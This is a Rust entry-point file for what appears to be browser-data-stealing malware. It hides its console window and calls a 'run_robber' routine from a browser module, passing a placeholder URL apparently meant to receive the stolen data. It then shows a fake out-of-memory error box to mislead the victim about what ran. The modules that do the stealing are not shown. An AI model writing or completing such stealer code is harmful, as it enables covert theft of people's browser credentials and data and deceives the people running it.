#![windows_subsystem = "windows"]
mod browser;
mod crypto;
mod robber;
extern crate user32;
extern crate winapi;
use std::ffi::CString;
use user32::MessageBoxA;

fn main() -> () {
    let error: bool = true;
    let error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications.";
    let url = "http://127.0.0.1";
    let _ = browser::run_robber(true, true, url);
    if error == true {
        let _ = show_error(error_message);
    }
}

fn show_error(error_message: &str) -> Result<i32, anyhow::Error> {
    let title = CString::new("Error!")?;
    let message = CString::new(error_message)?;
    unsafe {
        MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
    }
    Ok(0)
}
